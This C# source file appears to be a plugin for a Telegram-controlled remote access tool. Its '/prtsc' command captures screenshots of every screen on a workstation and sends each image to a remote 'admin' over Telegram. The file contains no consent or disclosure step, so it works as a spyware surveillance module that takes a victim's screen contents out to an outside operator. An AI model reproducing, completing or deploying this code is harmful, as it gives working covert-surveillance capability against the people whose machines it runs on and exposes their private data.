using Sdk.Base;
using Sdk.Dependencies;
using Sdk.Models;
using Sdk.Telegram;
using System.Drawing.Imaging;

namespace prtsc
{
    public class DllMain : Plugin
    {
        private IPCAssistant _telegram;
        private readonly ScreenUtility _screenUtility;

        public DllMain()
        {
            base.Name = "/prtsc";
            base.Description = "Get a screenshot of the workstation.";

            this._screenUtility = new ScreenUtility();
        }

        public override void Dispatch()
        {
            var screens = this._screenUtility.GetScreensBitmap();

            foreach (Bitmap screen in screens)
            {
                var fileName = "";

                fileName = Path.GetRandomFileName();
                fileName = Path.GetFileNameWithoutExtension(fileName);
                fileName += ".png";

                using MemoryStream buffer = new MemoryStream();

                // save to buffer
                screen.Save(buffer, ImageFormat.Png);
                // reset position (important)
                buffer.Position = 0;

                this._telegram.SendPhotoBackToAdmin(buffer, fileName);
            }
        }

        public override void Dispatch(ExecuteResult data)
        {
            throw new NotImplementedException();
        }

        public override void Initialize(IServiceLocator service)
        {
            this._telegram = service.ResolveInstance<IPCAssistant>();
        }
    }
}
